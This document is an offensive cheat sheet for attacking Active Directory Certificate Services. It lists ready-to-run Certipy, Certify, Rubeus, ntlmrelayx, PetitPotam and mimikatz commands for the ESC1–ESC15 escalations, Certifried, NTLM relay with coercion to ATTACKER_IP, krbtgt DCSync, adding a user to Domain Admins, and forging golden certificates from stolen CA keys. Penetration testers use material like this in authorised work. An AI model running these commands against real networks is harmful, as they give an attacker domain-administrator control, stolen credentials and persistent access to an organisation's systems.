# Active Directory Certificate Services (ADCS)

## ADCS Enumeration

```ps1
# NetExec
netexec ldap domain.lab -u user -p pass -M adcs

# Certipy (comprehensive)
certipy find 'corp.local/john:Pass@dc.corp.local' -bloodhound
certipy find 'corp.local/john:Pass@dc.corp.local' -vulnerable -hide-admins

# Certify (Windows)
Certify.exe cas
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser

# ldapsearch
ldapsearch -H ldap://DC_IP -x -D "user@domain.local" -W -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName

# certutil
certutil.exe -config - -ping
certutil -dump
```

## Pass-The-Certificate

```ps1
# Windows - Rubeus
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERT_PASS" /domain:"FQDN" /dc:"DC" /show

# Linux - Certipy
certipy auth -pfx "cert.pfx" -dc-ip 10.10.10.10 -username user -domain domain.local

# Linux - PKINITtools
gettgtpkinit.py -pfx-base64 $(cat b64cert.txt) "FQDN_DOMAIN/TARGET_SAMNAME" "TGT.ccache"
gettgtpkinit.py -cert-pem cert.pem -key-pem key.pem "domain/user" "TGT.ccache"
```

## UnPAC The Hash (cert → NT hash)

```ps1
# Certipy
certipy auth -pfx 'user.pfx' -dc-ip 10.10.10.10 -username user -domain domain.lab

# Rubeus
Rubeus.exe asktgt /getcredentials /user:"TARGET" /certificate:"BASE64_CERT" /password:"PASS" /domain:"FQDN" /dc:"DC" /show

# PKINITtools
gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass pass "domain/user" tgt.ccache
export KRB5CCNAME=tgt.ccache
getnthash.py -key 'AS-REP encryption key' 'domain/user'
```

## PKINIT Errors

| Error | Cause | Fix |
|-------|-------|-----|
| `KDC_ERROR_CLIENT_NOT_TRUSTED` | DC doesn't support PKINIT | Try another DC or use LDAP shell |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | CA might be expired | Use Pass-The-Cert via LDAPS |
| `CERTSRV_E_TEMPLATE_DENIED` | No enroll permission | Escalate first |
| `KDC_ERR_INCONSISTENT_KEY_PURPOSE` | Wrong EKU | Check template EKUs |

```ps1
# When PKINIT fails, use LDAP shell
certipy auth -pfx target.pfx -debug -username user -domain domain.local -dns-tcp -dc-ip 10.10.10.10 -ldap-shell
```

## Certifried CVE-2022-26923

```ps1
# Add computer (MachineAccountQuota must be > 0)
bloodyAD -d lab.local -u user -p 'Pass' --host 10.10.10.10 add computer cve 'CVEPassword!'
certipy account create 'lab.local/user:Pass@dc.lab.local' -user 'cve' -dns 'dc.lab.local'

# Set dNSHostName to DC's hostname
bloodyAD -d lab.local -u user -p 'Pass' --host 10.10.10.10 set object 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName -v DC.lab.local

# Request Machine cert → get DC pfx
certipy req 'lab.local/cve$:CVEPass@10.10.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-CA

# Auth as DC
certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10
```

## ESC1 - ENROLLEE_SUPPLIES_SUBJECT

**Requirements**: Template allows AD auth + `ENROLLEE_SUPPLIES_SUBJECT` flag + no manager approval

```ps1
# Find
Certify.exe find /vulnerable
certipy find 'domain.local/user:pass@dc' -bloodhound

# Exploit - request cert with altname (impersonate DA)
Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
certipy req 'corp.local/john:Pass@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN

# Convert and use
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
```

## ESC2 - Any Purpose EKU

Same exploitation as ESC1 (request with altname). Find template with `Any Purpose EKU` (2.5.29.37.0).

## ESC3 - Enrollment Agent

```ps1
# Step 1: get enrollment agent cert
certipy req 'corp.local/john:Pass@ca.corp.local' -ca 'corp-CA' -template 'ESC3'

# Step 2: request cert on behalf of admin
certipy req 'corp.local/john:Pass@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
```

## ESC4 - Write Permissions on Template

```ps1
# Add ENROLLEE_SUPPLIES_SUBJECT to make it like ESC1
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag

# Using Certipy
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525... -template 'ESC4' -save-old
certipy req 'corp.local/john:Pass@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525... -template 'ESC4' -configuration ESC4.json
```

## ESC5 - Vulnerable PKI Object ACL

Escalate child DA → Enterprise Admin using access to certificate container.

```ps1
# Backup CA cert (on child DC as SYSTEM)
certipy ca -backup -u user@domain.local -p pass -dc-ip 10.10.10.10 -ca 'DOMAIN-CA' -target 10.10.10.11

# Forge domain admin cert
certipy forge -ca-pfx 'DOMAIN-CA.pfx' -upn administrator@domain.local
```

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

```ps1
# Check
Certify.exe cas  # look for UserSpecifiedSAN flag

# Exploit (request any template with altname)
Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:User /altname:DomAdmin

# Mitigation
certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2
```

## ESC7 - ManageCA / Manage Certificates

```ps1
# Find
certipy find -enabled -u user@domain.local -p pass -dc-ip 10.10.10.10

# Add officer role
certipy ca -ca 'DOMAIN-CA' -username user@domain.local -p pass -add-officer user -dc-ip 10.10.10.10 -target-ip 10.10.10.11

# Enable SubCA, request, issue, retrieve
certipy ca -ca 'DOMAIN-CA' -enable-template 'SubCA' -username user@domain.local -p pass -dc-ip 10.10.10.10 -target-ip 10.10.10.11
certipy req -ca 'DOMAIN-CA' -username user@domain.local -p pass -dc-ip 10.10.10.10 -target-ip 10.10.10.11 -template SubCA -upn administrator@domain.local
certipy ca -ca 'DOMAIN-CA' -issue-request 7 -username user@domain.local -p pass -dc-ip 10.10.10.10 -target-ip 10.10.10.11
certipy req -ca 'DOMAIN-CA' -username user@domain.local -p pass -dc-ip 10.10.10.10 -target-ip 10.10.10.11 -retrieve 7
```

## ESC8 - NTLM Relay to ADCS HTTP Enrollment

```ps1
# Setup relay
python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce authentication (choose one)
python3 petitpotam.py -d domain -u user -p pass ATTACKER_IP DC_IP
python3 dementor.py ATTACKER_IP DC_IP -u user -p pass -d domain

# Use the base64 cert from relay output
Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQ[...]Qla6 /ptt
mimikatz> lsadump::dcsync /user:krbtgt

# Certipy automated
certipy relay -ca 172.16.19.100
```

## ESC9 - No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

```ps1
# Requires GenericWrite over Jane, target is Administrator
certipy shadow auto -username John@corp.local -p Pass -account Jane
certipy account update -username John@corp.local -password Pass -user Jane -upn Administrator
certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9
certipy account update -username John@corp.local -password Pass -user Jane@corp.local
certipy auth -pfx administrator.pfx -domain corp.local
```

## ESC10 - Weak Certificate Mapping

**StrongCertificateBindingEnforcement=0:**
```ps1
certipy shadow auto -username "user@domain.local" -p "pass" -account admin -dc-ip 10.10.10.10
certipy account update -username "user@domain.local" -p "pass" -user admin -upn administrator -dc-ip 10.10.10.10
certipy req -username "admin@domain.local" -hashes "hashes" -target "10.10.10.10" -ca 'DOMAIN-CA' -template 'user'
certipy account update -username "user@domain.local" -p "pass" -user admin -upn admin -dc-ip 10.10.10.10
certipy auth -pfx 'administrator.pfx' -domain "domain.local" -dc-ip 10.10.10.10
```

## ESC11 - Relaying NTLM to ICPR (RPC)

```ps1
# Check for disabled encryption
certipy find -u user@dc1.lab.local -p 'PASS' -dc-ip 10.10.10.10 -stdout | grep -i ESC11

# Relay
certipy relay -target rpc://dc.domain.local -ca 'DOMAIN-CA' -template DomainController
# OR
ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
```

## ESC12 - YubiHSM Key

Registry key: `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` (cleartext password)

## ESC13 - Issuance Policy OID Group Link

```ps1
# Find template with issuance policy linked to Universal group
certipy find -target dc.lab.local -dc-ip 10.10.10.10 -u user -p pass -stdout -vulnerable

# Request cert → get ticket → become member of linked group
certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u user -p pass -template ESC13Template -ca <CA-NAME>
Rubeus.exe asktgt /user:ESC13User /certificate:esc13.pfx /nowrap  # ticket grants group membership
Rubeus.exe ptt /ticket:<ticket>
```

## ESC14 - altSecurityIdentities

```ps1
# Stifle (Windows)
Certify.exe request /ca:lab.lan\lab-dc01-ca /template:Machine /machine
Stifle.exe add /object:target /certificate:MIIMrQI... /password:Pass

# Certipy (Linux)
certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u "ESC13$@lab.local" -p 'Pass' -template Machine -ca LAB-CA
# Get IssuerSerialNumber and add mapping:
Add-AltSecIDMapping -DistinguishedName "CN=Admin,CN=Users,DC=lab,DC=local" -MappingString "<x509-issuer-serial>"
Rubeus.exe asktgt /user:Administrator /certificate:esc13.pfx /domain:lab.local /dc:dc.lab.local
```

## ESC15 - EKUwu / Application Policies (CVE-2024-49019)

**Requirements**: Schema v1 template + `ENROLLEE_SUPPLIES_SUBJECT = True`

```ps1
# Add Client Authentication EKU to WebServer template
certipy req -dc-ip 10.10.10.10 -ca CA -target-ip 10.10.10.11 -u user@domain.com -p 'Pass' -template WebServer -upn Administrator@domain.com --application-policies 'Client Authentication'
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# In LDAP shell
add_user pentest_user
add_user_to_group pentest_user "Domain Admins"
```

## Golden Certificate (Forge with CA Private Key)

```ps1
# Export CA private key
certipy ca -u 'admin@corp.local' -p 'Pass' -ns 10.10.10.10 -target 'CA.CORP.LOCAL' -config 'CA.CORP.LOCAL\CORP-CA' -backup
mimikatz> crypto::capi  
mimikatz> crypto::cng
mimikatz> crypto::certificates /export
Certify.exe manage-self --dump-certs

# Forge certificate
certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "Pass" --Subject "CN=User" --SubjectAltName "admin@domain.local" --NewCertPath "admin.pfx" --NewCertPassword "Pass"

# Request TGT with forged cert
certipy auth -pfx 'administrator_forged.pfx' -dc-ip '10.10.10.10'
Rubeus.exe asktgt /user:Administrator /domain:domain.local /certificate:admin.pfx
```
